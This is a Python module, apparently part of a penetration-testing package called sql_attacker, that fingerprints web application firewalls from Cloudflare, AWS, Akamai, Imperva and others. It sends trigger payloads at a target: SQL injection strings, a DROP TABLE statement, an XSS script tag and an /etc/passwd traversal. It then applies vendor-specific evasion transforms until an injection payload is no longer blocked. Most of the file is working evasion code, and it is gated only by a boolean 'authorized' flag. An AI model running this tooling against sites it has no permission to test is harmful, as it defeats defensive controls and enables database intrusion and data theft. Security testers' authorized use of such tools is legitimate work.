"""
WAF Profiler – Advanced WAF Fingerprinting and Evasion
=======================================================

Provides active WAF fingerprinting by sending known trigger payloads and
analysing the resulting response patterns (headers, body, status codes, and
timing) to identify the WAF vendor.  Vendor-specific bypass chains are
returned so callers can iterate through evasion techniques automatically.

Usage::

    from sql_attacker.waf_profiler import WAFProfiler
    from sql_attacker.engine.config import ScanConfig
    import urllib.request

    def simple_request(url: str) -> "WAFProfiler._Response":
        with urllib.request.urlopen(url, timeout=10) as resp:
            return {"status": resp.status, "headers": dict(resp.headers),
                    "body": resp.read().decode("utf-8", errors="replace"),
                    "elapsed_ms": 0.0}

    cfg = ScanConfig()
    profiler = WAFProfiler(cfg, simple_request, authorized=True)
    profile = profiler.fingerprint("https://example.com/page", parameter="id")
    print(profile.vendor, profile.confidence)
    chain = profiler.get_bypass_chain(profile.vendor.value)
    evaded = profiler.adaptive_evasion(
        "https://example.com/page", "id", "' OR 1=1--", chain
    )
"""

from __future__ import annotations

import random
import re
import string
import time
import urllib.parse
from dataclasses import dataclass, field
from enum import Enum
from typing import Callable, Dict, List, Optional, Tuple

# ---------------------------------------------------------------------------
# Engine integration imports
# ---------------------------------------------------------------------------
from sql_attacker.engine.config import ScanConfig
from sql_attacker.engine.scoring import compute_confidence
from sql_attacker.engine.reporting import Finding, Evidence
from sql_attacker.guardrails import check_authorization

# ---------------------------------------------------------------------------
# Optional tamper_scripts integration (graceful degradation)
# ---------------------------------------------------------------------------
try:
    from sql_attacker.tamper_scripts import TamperScripts as _TamperScripts
    _TAMPER_AVAILABLE = True
except ImportError:  # pragma: no cover
    _TamperScripts = None  # type: ignore[assignment,misc]
    _TAMPER_AVAILABLE = False


# ---------------------------------------------------------------------------
# Enumerations
# ---------------------------------------------------------------------------

class WAFVendor(str, Enum):
    """Known WAF vendors that can be fingerprinted."""

    NONE = "none"
    CLOUDFLARE = "cloudflare"
    AWS_WAF = "aws_waf"
    MODSECURITY = "modsecurity"
    AKAMAI = "akamai"
    F5_BIG_IP = "f5_big_ip"
    IMPERVA = "imperva"
    SUCURI = "sucuri"
    BARRACUDA = "barracuda"
    UNKNOWN = "unknown"


class BypassTechnique(str, Enum):
    """Evasion / bypass techniques available to the profiler."""

    SPACE_TO_COMMENT = "space_to_comment"
    CHAR_ENCODE = "char_encode"
    RANDOM_CASE = "random_case"
    DOUBLE_ENCODE = "double_encode"
    UNICODE_NORMALIZE = "unicode_normalize"
    INLINE_COMMENT = "inline_comment"
    VERSIONED_COMMENT = "versioned_comment"
    HEX_ENCODE = "hex_encode"
    URL_ENCODE = "url_encode"
    NEWLINE_INJECT = "newline_inject"


# ---------------------------------------------------------------------------
# Data containers
# ---------------------------------------------------------------------------

@dataclass
class WAFProfile:
    """Result of a WAF fingerprinting operation.

    Attributes
    ----------
    vendor:
        The detected WAF vendor (or :attr:`WAFVendor.NONE` / :attr:`WAFVendor.UNKNOWN`).
    confidence:
        Numeric confidence in [0, 1] that the vendor identification is correct.
    evidence:
        Human-readable list of indicators that contributed to the verdict.
    response_codes:
        HTTP status codes observed during the fingerprinting probes.
    response_headers:
        Interesting response headers collected during probing.
    bypass_chain:
        Ordered list of :class:`BypassTechnique` values recommended for this
        WAF vendor.
    """

    vendor: WAFVendor
    confidence: float
    evidence: List[str]
    response_codes: List[int]
    response_headers: Dict[str, str]
    bypass_chain: List[str]


# ---------------------------------------------------------------------------
# Internal type alias for the callable the caller provides
# ---------------------------------------------------------------------------

# request_fn must accept (url: str) and return a dict with at minimum:
#   status     : int
#   headers    : Dict[str, str]   (header names lower-cased)
#   body       : str
#   elapsed_ms : float
_ResponseDict = Dict[str, object]


# ---------------------------------------------------------------------------
# WAF signature database
# ---------------------------------------------------------------------------

# Mapping vendor → list of (header_name_lower, regex_pattern) tuples.
_HEADER_SIGNATURES: Dict[WAFVendor, List[Tuple[str, str]]] = {
    WAFVendor.CLOUDFLARE: [
        ("cf-ray", r".+"),
        ("server", r"(?i)cloudflare"),
        ("x-powered-by", r"(?i)cloudflare"),
    ],
    WAFVendor.AWS_WAF: [
        ("x-amzn-requestid", r".+"),
        ("x-amz-cf-id", r".+"),
        ("x-amzn-trace-id", r".+"),
        ("server", r"(?i)awselb|AmazonS3"),
    ],
    WAFVendor.AKAMAI: [
        ("x-check-cacheable", r".+"),
        ("x-akamai-transformed", r".+"),
        ("x-akamai-request-id", r".+"),
        ("server", r"(?i)akamaighost|edgesuit"),
    ],
    WAFVendor.F5_BIG_IP: [
        ("x-waf-status", r".+"),
        ("x-waf-event-info", r".+"),
        ("server", r"(?i)big-?ip"),
        ("x-cnection", r".+"),
    ],
    WAFVendor.IMPERVA: [
        ("x-iinfo", r".+"),
        ("x-cdn", r"(?i)imperva|incapsula"),
        ("set-cookie", r"(?i)incap_ses|visid_incap"),
    ],
    WAFVendor.SUCURI: [
        ("x-sucuri-id", r".+"),
        ("x-sucuri-cache", r".+"),
        ("server", r"(?i)sucuri"),
    ],
    WAFVendor.BARRACUDA: [
        ("x-barracuda-baas-error", r".+"),
        ("x-barracuda-connect", r".+"),
        ("server", r"(?i)barracuda"),
    ],
    WAFVendor.MODSECURITY: [
        ("server", r"(?i)mod_security|modsecurity"),
        ("x-mod-security", r".+"),
    ],
}

# Body signatures: vendor → list of regex patterns matched against response body.
_BODY_SIGNATURES: Dict[WAFVendor, List[str]] = {
    WAFVendor.CLOUDFLARE: [
        r"(?i)attention\s+required.*cloudflare",
        r"(?i)cloudflare\s+ray\s+id",
        r"(?i)error\s+1020.*cloudflare",
        r"(?i)cloudflare-nginx",
    ],
    WAFVendor.AWS_WAF: [
        r"(?i)request\s+blocked.*aws",
        r"(?i)403\s+forbidden.*aws",
        r"aws-waf-managed-rules",
    ],
    WAFVendor.AKAMAI: [
        r"(?i)access\s+denied.*akamai",
        r"(?i)reference\s+#\d+\.\w+\.akamai",
        r"(?i)akamai\s+ghost",
    ],
    WAFVendor.F5_BIG_IP: [
        r"(?i)the\s+requested\s+url\s+was\s+rejected.*f5",
        r"(?i)support\s+id.*\d{15,}",
        r"(?i)asm.*violation",
    ],
    WAFVendor.IMPERVA: [
        r"(?i)incapsula\s+incident",
        r"(?i)powered\s+by\s+incapsula",
        r"(?i)imperva.*blocked",
    ],
    WAFVendor.SUCURI: [
        r"(?i)sucuri\s+website\s+firewall",
        r"(?i)access\s+denied.*sucuri",
        r"(?i)cloudproxy.*sucuri",
    ],
    WAFVendor.BARRACUDA: [
        r"(?i)barracuda\s+networks",
        r"(?i)energize\s+updates",
        r"(?i)barracuda\s+web\s+application\s+firewall",
    ],
    WAFVendor.MODSECURITY: [
        r"(?i)not\s+acceptable.*mod_security",
        r"(?i)modsecurity",
        r"(?i)406\s+not\s+acceptable",
    ],
}

# Status codes that indicate WAF intervention.
_WAF_STATUS_CODES: frozenset = frozenset({403, 406, 429, 451})

# Payloads known to trigger WAF rules.
_TRIGGER_PAYLOADS: List[str] = [
    "' OR '1'='1",
    "1 UNION SELECT NULL--",
    "1; DROP TABLE users--",
    "<script>alert(1)</script>",
    "../../etc/passwd",
    "' AND SLEEP(5)--",
    "1 OR 1=1",
]

# ---------------------------------------------------------------------------
# Vendor-specific bypass chains
# ---------------------------------------------------------------------------

_VENDOR_BYPASS_CHAINS: Dict[str, List[str]] = {
    WAFVendor.CLOUDFLARE.value: [
        BypassTechnique.UNICODE_NORMALIZE.value,
        BypassTechnique.INLINE_COMMENT.value,
        BypassTechnique.RANDOM_CASE.value,
        BypassTechnique.URL_ENCODE.value,
        BypassTechnique.SPACE_TO_COMMENT.value,
        BypassTechnique.VERSIONED_COMMENT.value,
    ],
    WAFVendor.AWS_WAF.value: [
        BypassTechnique.SPACE_TO_COMMENT.value,
        BypassTechnique.VERSIONED_COMMENT.value,
        BypassTechnique.CHAR_ENCODE.value,
        BypassTechnique.NEWLINE_INJECT.value,
        BypassTechnique.UNICODE_NORMALIZE.value,
        BypassTechnique.DOUBLE_ENCODE.value,
    ],
    WAFVendor.MODSECURITY.value: [
        BypassTechnique.VERSIONED_COMMENT.value,
        BypassTechnique.INLINE_COMMENT.value,
        BypassTechnique.RANDOM_CASE.value,
        BypassTechnique.SPACE_TO_COMMENT.value,
        BypassTechnique.HEX_ENCODE.value,
        BypassTechnique.CHAR_ENCODE.value,
    ],
    WAFVendor.AKAMAI.value: [
        BypassTechnique.UNICODE_NORMALIZE.value,
        BypassTechnique.DOUBLE_ENCODE.value,
        BypassTechnique.CHAR_ENCODE.value,
        BypassTechnique.SPACE_TO_COMMENT.value,
        BypassTechnique.RANDOM_CASE.value,
        BypassTechnique.NEWLINE_INJECT.value,
    ],
    WAFVendor.F5_BIG_IP.value: [
        BypassTechnique.INLINE_COMMENT.value,
        BypassTechnique.VERSIONED_COMMENT.value,
        BypassTechnique.HEX_ENCODE.value,
        BypassTechnique.SPACE_TO_COMMENT.value,
        BypassTechnique.UNICODE_NORMALIZE.value,
        BypassTechnique.CHAR_ENCODE.value,
    ],
    WAFVendor.IMPERVA.value: [
        BypassTechnique.RANDOM_CASE.value,
        BypassTechnique.VERSIONED_COMMENT.value,
        BypassTechnique.UNICODE_NORMALIZE.value,
        BypassTechnique.INLINE_COMMENT.value,
        BypassTechnique.DOUBLE_ENCODE.value,
        BypassTechnique.URL_ENCODE.value,
    ],
    WAFVendor.SUCURI.value: [
        BypassTechnique.SPACE_TO_COMMENT.value,
        BypassTechnique.CHAR_ENCODE.value,
        BypassTechnique.URL_ENCODE.value,
        BypassTechnique.RANDOM_CASE.value,
        BypassTechnique.INLINE_COMMENT.value,
        BypassTechnique.HEX_ENCODE.value,
    ],
    WAFVendor.BARRACUDA.value: [
        BypassTechnique.HEX_ENCODE.value,
        BypassTechnique.CHAR_ENCODE.value,
        BypassTechnique.DOUBLE_ENCODE.value,
        BypassTechnique.VERSIONED_COMMENT.value,
        BypassTechnique.INLINE_COMMENT.value,
        BypassTechnique.NEWLINE_INJECT.value,
    ],
    WAFVendor.UNKNOWN.value: [
        BypassTechnique.SPACE_TO_COMMENT.value,
        BypassTechnique.RANDOM_CASE.value,
        BypassTechnique.INLINE_COMMENT.value,
        BypassTechnique.VERSIONED_COMMENT.value,
        BypassTechnique.CHAR_ENCODE.value,
        BypassTechnique.UNICODE_NORMALIZE.value,
        BypassTechnique.DOUBLE_ENCODE.value,
        BypassTechnique.HEX_ENCODE.value,
        BypassTechnique.URL_ENCODE.value,
        BypassTechnique.NEWLINE_INJECT.value,
    ],
    WAFVendor.NONE.value: [],
}


# ---------------------------------------------------------------------------
# Main class
# ---------------------------------------------------------------------------

class WAFProfiler:
    """Active WAF fingerprinter with vendor-specific bypass chains.

    Parameters
    ----------
    config:
        A :class:`~sql_attacker.engine.config.ScanConfig` instance that
        controls request timeouts, retry behaviour, and per-host budgets.
    request_fn:
        A callable ``(url: str) -> dict`` that performs an HTTP GET and
        returns a dict with keys:

        * ``status``     – HTTP status code (``int``)
        * ``headers``    – response headers as ``Dict[str, str]`` with
          **lower-cased** key names
        * ``body``       – decoded response body (``str``)
        * ``elapsed_ms`` – round-trip time in milliseconds (``float``)

    authorized:
        Must be ``True`` (explicit written permission to test the target).
        Passed straight to :func:`~sql_attacker.guardrails.check_authorization`.
    """

    def __init__(
        self,
        config: ScanConfig,
        request_fn: Callable[[str], _ResponseDict],
        authorized: bool = False,
    ) -> None:
        self._config = config
        self._request_fn = request_fn
        self._authorized = authorized

    # ------------------------------------------------------------------
    # Public API
    # ------------------------------------------------------------------

    def fingerprint(self, url: str, parameter: str = "id") -> WAFProfile:
        """Send trigger payloads and analyse responses to identify the WAF.

        Parameters
        ----------
        url:
            Target URL.  If the URL already contains a query string the
            ``parameter`` value will be *appended*; otherwise it is added
            fresh.
        parameter:
            Query-string parameter name to inject the trigger payloads into.

        Returns
        -------
        :class:`WAFProfile`
            Profile containing vendor, confidence, evidence, and the
            recommended bypass chain for this vendor.

        Raises
        ------
        AuthorizationError
            If ``authorized`` was not set to ``True`` at construction time.
        """
        check_authorization(self._authorized)

        collected_status_codes: List[int] = []
        collected_headers: Dict[str, str] = {}
        all_evidence: List[str] = []

        # Accumulate vendor hit counts across all probes.
        vendor_hits: Dict[WAFVendor, int] = {v: 0 for v in WAFVendor}
        timing_samples: List[float] = []

        for payload in _TRIGGER_PAYLOADS:
            probe_url = self._build_probe_url(url, parameter, payload)
            try:
                resp = self._request_fn(probe_url)
            except Exception as exc:  # noqa: BLE001
                all_evidence.append(f"Request error for payload {payload!r}: {exc}")
                continue

            status = int(resp.get("status", 0))  # type: ignore[arg-type]
            headers: Dict[str, str] = {
                k.lower(): v
                for k, v in (resp.get("headers") or {}).items()  # type: ignore[union-attr]
            }
            body: str = str(resp.get("body", ""))
            elapsed: float = float(resp.get("elapsed_ms", 0.0))  # type: ignore[arg-type]

            collected_status_codes.append(status)
            timing_samples.append(elapsed)
            collected_headers.update(headers)

            # Score each vendor for this response.
            for vendor in WAFVendor:
                if vendor in (WAFVendor.NONE, WAFVendor.UNKNOWN):
                    continue
                score = self._score_response(vendor, status, headers, body)
                vendor_hits[vendor] += score
                if score > 0:
                    all_evidence.append(
                        f"[{vendor.value}] payload={payload!r} status={status} "
                        f"score_delta={score}"
                    )

        # Determine the best-matching vendor.
        vendor, confidence, evidence = self._resolve_vendor(
            vendor_hits, collected_status_codes, timing_samples, all_evidence
        )
        bypass_chain = self.get_bypass_chain(vendor.value)

        return WAFProfile(
            vendor=vendor,
            confidence=confidence,
            evidence=evidence,
            response_codes=collected_status_codes,
            response_headers=collected_headers,
            bypass_chain=bypass_chain,
        )

    def get_bypass_chain(self, waf_vendor: str) -> List[str]:
        """Return the ordered bypass chain for a given WAF vendor name.

        Parameters
        ----------
        waf_vendor:
            A :class:`WAFVendor` value string (e.g. ``"cloudflare"``).
            Falls back to the ``UNKNOWN`` chain if the vendor is not
            recognised.

        Returns
        -------
        List[str]
            Ordered list of :class:`BypassTechnique` value strings.
        """
        return list(
            _VENDOR_BYPASS_CHAINS.get(
                waf_vendor.lower(),
                _VENDOR_BYPASS_CHAINS[WAFVendor.UNKNOWN.value],
            )
        )

    def apply_bypass(self, payload: str, technique: str) -> str:
        """Apply a single bypass technique to *payload*.

        If ``tamper_scripts`` is available the corresponding method is
        delegated to :class:`~sql_attacker.tamper_scripts.TamperScripts`;
        otherwise a built-in implementation is used.

        Parameters
        ----------
        payload:
            The raw SQL injection payload string.
        technique:
            A :class:`BypassTechnique` value string.

        Returns
        -------
        str
            The transformed payload.
        """
        # Prefer TamperScripts when available.
        if _TAMPER_AVAILABLE and _TamperScripts is not None:
            tamper_method = _TAMPER_METHOD_MAP.get(technique)
            if tamper_method is not None:
                try:
                    return tamper_method(_TamperScripts, payload)
                except Exception:  # noqa: BLE001
                    pass  # Fall through to built-in implementation.

        return _apply_builtin_bypass(payload, technique)

    def adaptive_evasion(
        self,
        url: str,
        parameter: str,
        payload: str,
        bypass_chain: List[str],
    ) -> Optional[str]:
        """Iterate through *bypass_chain* until a technique is not blocked.

        Each technique is applied to *payload*, the result is sent to the
        target, and the response is checked for WAF blocking indicators
        (WAF-typical status codes or body signatures).  The first variant
        that passes through is returned.

        Parameters
        ----------
        url:
            Target URL.
        parameter:
            Query-string parameter name.
        payload:
            Original (un-modified) injection payload.
        bypass_chain:
            Ordered list of technique names to attempt, e.g. as returned by
            :meth:`get_bypass_chain`.

        Returns
        -------
        Optional[str]
            The first evading payload that was **not** blocked, or ``None``
            if every technique in the chain was blocked.

        Raises
        ------
        AuthorizationError
            If ``authorized`` was not set to ``True`` at construction time.
        """
        check_authorization(self._authorized)

        for technique in bypass_chain:
            transformed = self.apply_bypass(payload, technique)
            probe_url = self._build_probe_url(url, parameter, transformed)
            try:
                resp = self._request_fn(probe_url)
            except Exception:  # noqa: BLE001
                continue

            status = int(resp.get("status", 0))  # type: ignore[arg-type]
            body: str = str(resp.get("body", ""))

            if not self._is_blocked(status, body):
                return transformed

        return None

    # ------------------------------------------------------------------
    # Private helpers
    # ------------------------------------------------------------------

    @staticmethod
    def _build_probe_url(url: str, parameter: str, payload: str) -> str:
        """Append *parameter=payload* to *url* as a query-string argument."""
        separator = "&" if "?" in url else "?"
        encoded = urllib.parse.quote(payload, safe="")
        return f"{url}{separator}{parameter}={encoded}"

    @staticmethod
    def _score_response(
        vendor: WAFVendor,
        status: int,
        headers: Dict[str, str],
        body: str,
    ) -> int:
        """Return a non-negative integer hit score for *vendor* on one response."""
        score = 0

        # Header matching.
        for header_name, pattern in _HEADER_SIGNATURES.get(vendor, []):
            value = headers.get(header_name, "")
            if value and re.search(pattern, value):
                score += 2

        # Body matching.
        for pattern in _BODY_SIGNATURES.get(vendor, []):
            if re.search(pattern, body):
                score += 1

        # WAF-typical status codes add a small signal.
        if status in _WAF_STATUS_CODES:
            score += 1

        return score

    @staticmethod
    def _is_blocked(status: int, body: str) -> bool:
        """Return True if the response looks like WAF intervention."""
        if status in _WAF_STATUS_CODES:
            return True
        # Check for generic block body patterns.
        block_patterns = [
            r"(?i)access\s+denied",
            r"(?i)blocked",
            r"(?i)forbidden",
            r"(?i)not\s+acceptable",
            r"(?i)security\s+violation",
            r"(?i)request\s+rejected",
        ]
        return any(re.search(p, body) for p in block_patterns)

    def _resolve_vendor(
        self,
        vendor_hits: Dict[WAFVendor, int],
        status_codes: List[int],
        timing_samples: List[float],
        raw_evidence: List[str],
    ) -> Tuple[WAFVendor, float, List[str]]:
        """Determine the most-likely vendor and compute confidence.

        Returns
        -------
        Tuple of (vendor, confidence_float, evidence_list).
        """
        total_probes = len(_TRIGGER_PAYLOADS)
        waf_blocked_count = sum(1 for s in status_codes if s in _WAF_STATUS_CODES)

        # Build features for the confidence scorer.
        any_blocked = waf_blocked_count > 0
        dominant_vendor: Optional[WAFVendor] = None
        max_hits = 0

        for vendor, hits in vendor_hits.items():
            if vendor in (WAFVendor.NONE, WAFVendor.UNKNOWN):
                continue
            if hits > max_hits:
                max_hits = hits
                dominant_vendor = vendor

        # Timing anomaly: high mean latency may indicate WAF inspection.
        mean_elapsed = (
            sum(timing_samples) / len(timing_samples) if timing_samples else 0.0
        )
        timing_anomaly = mean_elapsed > (
            self._config.request_timeout_seconds * 300  # 30 % of timeout in ms
        )

        features: Dict[str, float] = {
            "http_error_code": float(any_blocked),
            "content_change": float(max_hits > 0),
            "repeatability": min(1.0, waf_blocked_count / max(total_probes, 1)),
            "timing_delta_significant": float(timing_anomaly),
            "benign_control_negative": float(not any_blocked),
        }

        scoring_result = compute_confidence(features)
        confidence = round(scoring_result.score, 4)

        # Assign final vendor.
        if dominant_vendor is not None and max_hits >= 2:
            final_vendor = dominant_vendor
        elif any_blocked:
            final_vendor = WAFVendor.UNKNOWN
        else:
            final_vendor = WAFVendor.NONE
            confidence = 1.0  # Confident no WAF detected.

        evidence: List[str] = list(raw_evidence)
        evidence.insert(
            0,
            f"WAF detection: vendor={final_vendor.value} confidence={confidence} "
            f"blocked={waf_blocked_count}/{total_probes} "
            f"mean_elapsed_ms={mean_elapsed:.1f}",
        )

        return final_vendor, confidence, evidence


# ---------------------------------------------------------------------------
# Built-in bypass implementations (no external dependencies)
# ---------------------------------------------------------------------------

def _apply_builtin_bypass(payload: str, technique: str) -> str:
    """Apply *technique* to *payload* using pure-stdlib implementations."""

    if technique == BypassTechnique.SPACE_TO_COMMENT.value:
        return payload.replace(" ", "/**/")

    if technique == BypassTechnique.CHAR_ENCODE.value:
        return "".join(f"%{ord(c):02x}" for c in payload)

    if technique == BypassTechnique.RANDOM_CASE.value:
        return "".join(
            c.upper() if random.random() > 0.5 else c.lower() for c in payload
        )

    if technique == BypassTechnique.DOUBLE_ENCODE.value:
        first = "".join(f"%{ord(c):02x}" for c in payload)
        return "".join(f"%{ord(c):02x}" for c in first)

    if technique == BypassTechnique.UNICODE_NORMALIZE.value:
        # Substitute common ASCII chars with look-alike Unicode code points.
        _unicode_map: Dict[str, str] = {
            "a": "\uff41",  # ａ FULLWIDTH LATIN SMALL LETTER A
            "e": "\uff45",  # ｅ
            "i": "\uff49",  # ｉ
            "o": "\uff4f",  # ｏ
            "u": "\uff55",  # ｕ
            "s": "\uff53",  # ｓ
            " ": "\u00a0",  # NO-BREAK SPACE
        }
        return "".join(_unicode_map.get(c, c) for c in payload)

    if technique == BypassTechnique.INLINE_COMMENT.value:
        # Insert /**/ between SQL keywords and the rest of the token.
        return re.sub(
            r"(?i)\b(select|union|insert|update|delete|from|where|and|or)\b",
            lambda m: m.group(0)[0] + "/**/" + m.group(0)[1:],
            payload,
        )

    if technique == BypassTechnique.VERSIONED_COMMENT.value:
        # Wrap spaces around keywords in MySQL versioned comments.
        return re.sub(
            r"(?i)\b(select|union|insert|update|delete|from|where|and|or)\b",
            lambda m: f"/*!{m.group(0)}*/",
            payload,
        )

    if technique == BypassTechnique.HEX_ENCODE.value:
        # Hex-encode string literals (content between quotes).
        def _to_hex(match: re.Match) -> str:  # type: ignore[type-arg]
            inner = match.group(1)
            hex_val = inner.encode().hex()
            return f"0x{hex_val}"

        return re.sub(r"'([^']*)'", _to_hex, payload)

    if technique == BypassTechnique.URL_ENCODE.value:
        return urllib.parse.quote(payload, safe="")

    if technique == BypassTechnique.NEWLINE_INJECT.value:
        # Replace spaces with URL-encoded newline + space to confuse parsers.
        return payload.replace(" ", "%0a ")

    # Unknown technique: return payload unchanged.
    return payload


# ---------------------------------------------------------------------------
# Mapping from BypassTechnique → TamperScripts method name
# ---------------------------------------------------------------------------

def _call_tamper(method_name: str, ts_class: object, payload: str) -> str:
    """Call *method_name* on *ts_class* (a TamperScripts class/instance)."""
    method = getattr(ts_class, method_name, None)
    if method is not None:
        return method(payload)
    return payload


# Map BypassTechnique → (TamperScripts method name)
_TAMPER_METHOD_MAP: Dict[str, Callable[[object, str], str]] = {
    BypassTechnique.SPACE_TO_COMMENT.value: lambda cls, p: _call_tamper(
        "space2comment", cls, p
    ),
    BypassTechnique.CHAR_ENCODE.value: lambda cls, p: _call_tamper(
        "charencode", cls, p
    ),
    BypassTechnique.RANDOM_CASE.value: lambda cls, p: _call_tamper(
        "randomcase", cls, p
    ),
    BypassTechnique.DOUBLE_ENCODE.value: lambda cls, p: _call_tamper(
        "chardoubleencode", cls, p
    ),
    BypassTechnique.URL_ENCODE.value: lambda cls, p: _call_tamper(
        "urlencode", cls, p
    ),
}
